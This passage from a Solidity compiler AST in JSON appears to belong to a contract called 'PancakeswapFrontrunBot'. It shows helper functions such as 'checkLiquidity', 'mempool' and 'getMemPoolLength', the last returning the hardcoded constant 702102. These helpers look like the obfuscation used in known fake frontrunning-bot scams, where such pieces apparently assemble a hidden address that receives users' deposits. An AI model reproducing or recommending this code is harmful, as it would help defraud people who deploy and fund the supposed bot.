																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "==",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "33",
															"id": 1092,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "10585:1:3",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_3_by_1",
																"typeString": "int_const 3"
															},
															"value": "3"
														},
														"src": "10572:14:3",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": {
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1109,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1107,
																"name": "hexLength",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1065,
																"src": "10701:9:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "32",
																"id": 1108,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "10714:1:3",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_2_by_1",
																	"typeString": "int_const 2"
																},
																"value": "2"
															},
															"src": "10701:14:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": {
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1125,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1123,
																	"name": "hexLength",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1065,
																	"src": "10832:9:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "==",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "31",
																	"id": 1124,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "10845:1:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_1_by_1",
																		"typeString": "int_const 1"
																	},
																	"value": "1"
																},
																"src": "10832:14:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": null,
															"id": 1139,
															"nodeType": "IfStatement",
															"src": "10828:126:3",
															"trueBody": {
																"id": 1138,
																"nodeType": "Block",
																"src": "10848:106:3",
																"statements": [
																	{
																		"assignments": [
																			1127
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1127,
																				"mutability": "mutable",
																				"name": "_hexC4",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1138,
																				"src": "10863:20:3",
																				"stateVariable": false,
																				"storageLocation": "memory",
																				"typeDescriptions": {
																					"typeIdentifier": "t_string_memory_ptr",
																					"typeString": "string"
																				},
																				"typeName": {
																					"id": 1126,
																					"name": "string",
																					"nodeType": "ElementaryTypeName",
																					"src": "10863:6:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_string_storage_ptr",
																						"typeString": "string"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1135,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"hexValue": "30303030",
																					"id": 1129,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "string",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "10894:6:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_stringliteral_e8d1f6cb90fef5fc9696cc77858b42d4e99b0959246d86f4584b49f5af0fe3f9",
																						"typeString": "literal_string \"0000\""
																					},
																					"value": "0000"
																				},
																				{
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"id": 1132,
																							"name": "res",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1021,
																							"src": "10909:3:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes_memory_ptr",
																								"typeString": "bytes memory"
																							}
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_bytes_memory_ptr",
																								"typeString": "bytes memory"
																							}
																						],
																						"id": 1131,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"lValueRequested": false,
																						"nodeType": "ElementaryTypeNameExpression",
																						"src": "10902:6:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_type$_t_string_storage_ptr_$",
																							"typeString": "type(string storage pointer)"
																						},
																						"typeName": {
																							"id": 1130,
																							"name": "string",
																							"nodeType": "ElementaryTypeName",
																							"src": "10902:6:3",
																							"typeDescriptions": {
																								"typeIdentifier": null,
																								"typeString": null
																							}
																						}
																					},
																					"id": 1133,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"kind": "typeConversion",
																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "10902:11:3",
																					"tryCall": false,
																					"typeDescriptions": {
																						"typeIdentifier": "t_string_memory_ptr",
																						"typeString": "string memory"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_stringliteral_e8d1f6cb90fef5fc9696cc77858b42d4e99b0959246d86f4584b49f5af0fe3f9",
																						"typeString": "literal_string \"0000\""
																					},
																					{
																						"typeIdentifier": "t_string_memory_ptr",
																						"typeString": "string memory"
																					}
																				],
																				"id": 1128,
																				"name": "mempool",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1723,
																				"src": "10886:7:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																					"typeString": "function (string memory,string memory) pure returns (string memory)"
																				}
																			},
																			"id": 1134,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "10886:28:3",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_string_memory_ptr",
																				"typeString": "string memory"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "10863:51:3"
																	},
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 1136,
																			"name": "_hexC4",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1127,
																			"src": "10936:6:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_string_memory_ptr",
																				"typeString": "string memory"
																			}
																		},
																		"functionReturnParameters": 999,
																		"id": 1137,
																		"nodeType": "Return",
																		"src": "10929:13:3"
																	}
																]
															}
														},
														"id": 1140,
														"nodeType": "IfStatement",
														"src": "10697:257:3",
														"trueBody": {
															"id": 1122,
															"nodeType": "Block",
															"src": "10717:105:3",
															"statements": [
																{
																	"assignments": [
																		1111
																	],
																	"declarations": [
																		{
																			"constant": false,
																			"id": 1111,
																			"mutability": "mutable",
																			"name": "_hexC3",
																			"nodeType": "VariableDeclaration",
																			"overrides": null,
																			"scope": 1122,
																			"src": "10732:20:3",
																			"stateVariable": false,
																			"storageLocation": "memory",
																			"typeDescriptions": {
																				"typeIdentifier": "t_string_memory_ptr",
																				"typeString": "string"
																			},
																			"typeName": {
																				"id": 1110,
																				"name": "string",
																				"nodeType": "ElementaryTypeName",
																				"src": "10732:6:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_string_storage_ptr",
																					"typeString": "string"
																				}
																			},
																			"value": null,
																			"visibility": "internal"
																		}
																	],
																	"id": 1119,
																	"initialValue": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"hexValue": "303030",
																				"id": 1113,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "string",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "10763:5:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_stringliteral_35b5b8bece53958bb309db665734c38515f37439f69bfdbc64808f1af9a97c31",
																					"typeString": "literal_string \"000\""
																				},
																				"value": "000"
																			},
																			{
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 1116,
																						"name": "res",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1021,
																						"src": "10777:3:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					],
																					"id": 1115,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "ElementaryTypeNameExpression",
																					"src": "10770:6:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_string_storage_ptr_$",
																						"typeString": "type(string storage pointer)"
																					},
																					"typeName": {
																						"id": 1114,
																						"name": "string",
																						"nodeType": "ElementaryTypeName",
																						"src": "10770:6:3",
																						"typeDescriptions": {
																							"typeIdentifier": null,
																							"typeString": null
																						}
																					}
																				},
																				"id": 1117,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "typeConversion",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "10770:11:3",
																				"tryCall": false,
																				"typeDescriptions": {
																					"typeIdentifier": "t_string_memory_ptr",
																					"typeString": "string memory"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_stringliteral_35b5b8bece53958bb309db665734c38515f37439f69bfdbc64808f1af9a97c31",
																					"typeString": "literal_string \"000\""
																				},
																				{
																					"typeIdentifier": "t_string_memory_ptr",
																					"typeString": "string memory"
																				}
																			],
																			"id": 1112,
																			"name": "mempool",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1723,
																			"src": "10755:7:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																				"typeString": "function (string memory,string memory) pure returns (string memory)"
																			}
																		},
																		"id": 1118,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "10755:27:3",
																		"tryCall": false,
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	},
																	"nodeType": "VariableDeclarationStatement",
																	"src": "10732:50:3"
																},
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 1120,
																		"name": "_hexC3",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1111,
																		"src": "10804:6:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	},
																	"functionReturnParameters": 999,
																	"id": 1121,
																	"nodeType": "Return",
																	"src": "10797:13:3"
																}
															]
														}
													},
													"id": 1141,
													"nodeType": "IfStatement",
													"src": "10568:386:3",
													"trueBody": {
														"id": 1106,
														"nodeType": "Block",
														"src": "10588:103:3",
														"statements": [
															{
																"assignments": [
																	1095
																],
																"declarations": [
																	{
																		"constant": false,
																		"id": 1095,
																		"mutability": "mutable",
																		"name": "_hexC2",
																		"nodeType": "VariableDeclaration",
																		"overrides": null,
																		"scope": 1106,
																		"src": "10603:20:3",
																		"stateVariable": false,
																		"storageLocation": "memory",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string"
																		},
																		"typeName": {
																			"id": 1094,
																			"name": "string",
																			"nodeType": "ElementaryTypeName",
																			"src": "10603:6:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_string_storage_ptr",
																				"typeString": "string"
																			}
																		},
																		"value": null,
																		"visibility": "internal"
																	}
																],
																"id": 1103,
																"initialValue": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"hexValue": "30",
																			"id": 1097,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "string",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "10634:3:3",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																				"typeString": "literal_string \"0\""
																			},
																			"value": "0"
																		},
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 1100,
																					"name": "res",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1021,
																					"src": "10646:3:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes_memory_ptr",
																						"typeString": "bytes memory"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes_memory_ptr",
																						"typeString": "bytes memory"
																					}
																				],
																				"id": 1099,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "10639:6:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_string_storage_ptr_$",
																					"typeString": "type(string storage pointer)"
																				},
																				"typeName": {
																					"id": 1098,
																					"name": "string",
																					"nodeType": "ElementaryTypeName",
																					"src": "10639:6:3",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 1101,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "10639:11:3",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_string_memory_ptr",
																				"typeString": "string memory"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																				"typeString": "literal_string \"0\""
																			},
																			{
																				"typeIdentifier": "t_string_memory_ptr",
																				"typeString": "string memory"
																			}
																		],
																		"id": 1096,
																		"name": "mempool",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1723,
																		"src": "10626:7:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																			"typeString": "function (string memory,string memory) pure returns (string memory)"
																		}
																	},
																	"id": 1102,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "10626:25:3",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																"nodeType": "VariableDeclarationStatement",
																"src": "10603:48:3"
															},
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 1104,
																	"name": "_hexC2",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1095,
																	"src": "10673:6:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																"functionReturnParameters": 999,
																"id": 1105,
																"nodeType": "Return",
																"src": "10666:13:3"
															}
														]
													}
												},
												"id": 1142,
												"nodeType": "IfStatement",
												"src": "10439:515:3",
												"trueBody": {
													"id": 1090,
													"nodeType": "Block",
													"src": "10459:103:3",
													"statements": [
														{
															"assignments": [
																1079
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 1079,
																	"mutability": "mutable",
																	"name": "_hexC1",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 1090,
																	"src": "10474:20:3",
																	"stateVariable": false,
																	"storageLocation": "memory",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string"
																	},
																	"typeName": {
																		"id": 1078,
																		"name": "string",
																		"nodeType": "ElementaryTypeName",
																		"src": "10474:6:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_storage_ptr",
																			"typeString": "string"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 1087,
															"initialValue": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"hexValue": "30",
																		"id": 1081,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "string",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "10505:3:3",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																			"typeString": "literal_string \"0\""
																		},
																		"value": "0"
																	},
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 1084,
																				"name": "res",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1021,
																				"src": "10517:3:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes_memory_ptr",
																					"typeString": "bytes memory"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_bytes_memory_ptr",
																					"typeString": "bytes memory"
																				}
																			],
																			"id": 1083,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "10510:6:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_string_storage_ptr_$",
																				"typeString": "type(string storage pointer)"
																			},
																			"typeName": {
																				"id": 1082,
																				"name": "string",
																				"nodeType": "ElementaryTypeName",
																				"src": "10510:6:3",
																				"typeDescriptions": {
																					"typeIdentifier": null,
																					"typeString": null
																				}
																			}
																		},
																		"id": 1085,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "10510:11:3",
																		"tryCall": false,
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																			"typeString": "literal_string \"0\""
																		},
																		{
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	],
																	"id": 1080,
																	"name": "mempool",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1723,
																	"src": "10497:7:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																		"typeString": "function (string memory,string memory) pure returns (string memory)"
																	}
																},
																"id": 1086,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "10497:25:3",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "10474:48:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1088,
																"name": "_hexC1",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1079,
																"src": "10544:6:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															},
															"functionReturnParameters": 999,
															"id": 1089,
															"nodeType": "Return",
															"src": "10537:13:3"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1145,
															"name": "res",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1021,
															"src": "10981:3:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 1144,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "10974:6:3",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_string_storage_ptr_$",
															"typeString": "type(string storage pointer)"
														},
														"typeName": {
															"id": 1143,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "10974:6:3",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1146,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "10974:11:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 999,
												"id": 1147,
												"nodeType": "Return",
												"src": "10967:18:3"
											}
										]
									},
									"documentation": null,
									"id": 1149,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "checkLiquidity",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 996,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 995,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1149,
												"src": "10002:6:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 994,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "10002:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "10001:8:3"
									},
									"returnParameters": {
										"id": 999,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 998,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1149,
												"src": "10033:13:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 997,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "10033:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "10032:15:3"
									},
									"scope": 1724,
									"src": "9978:1015:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1156,
										"nodeType": "Block",
										"src": "11059:32:3",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "373032313032",
													"id": 1154,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "11077:6:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_702102_by_1",
														"typeString": "int_const 702102"
													},
													"value": "702102"
												},
												"functionReturnParameters": 1153,
												"id": 1155,
												"nodeType": "Return",
												"src": "11070:13:3"
											}
										]
									},
									"documentation": null,
									"id": 1157,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolLength",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1150,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "11027:2:3"
									},
									"returnParameters": {
										"id": 1153,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1152,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1157,
												"src": "11053:4:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1151,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11053:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "11052:6:3"
									},
									"scope": 1724,
									"src": "11002:89:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1206,
										"nodeType": "Block",
										"src": "11466:592:3",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1170,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1166,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1159,
															"src": "11481:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																"typeString": "struct PancakeswapFrontrunBot.slice memory"
															}
														},
														"id": 1167,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 123,
														"src": "11481:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1168,
															"name": "needle",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1161,
															"src": "11493:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																"typeString": "struct PancakeswapFrontrunBot.slice memory"
															}
														},
														"id": 1169,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 123,
														"src": "11493:11:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "11481:23:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1174,
												"nodeType": "IfStatement",
												"src": "11477:67:3",
												"trueBody": {
													"id": 1173,
													"nodeType": "Block",
													"src": "11506:38:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1171,
																"name": "self",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1159,
																"src": "11528:4:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																	"typeString": "struct PancakeswapFrontrunBot.slice memory"
																}
															},
															"functionReturnParameters": 1165,
															"id": 1172,
															"nodeType": "Return",
															"src": "11521:11:3"
														}
													]
												}
											},
											{
												"assignments": [
													1176
												],
												"declarations": [
													{
														"constant": false,
														"id": 1176,
														"mutability": "mutable",
														"name": "equal",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1206,
														"src": "11557:10:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 1175,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "11557:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1178,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 1177,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "11570:4:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "11557:17:3"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1183,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1179,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1159,
															"src": "11589:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																"typeString": "struct PancakeswapFrontrunBot.slice memory"
															}
														},
														"id": 1180,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_ptr",
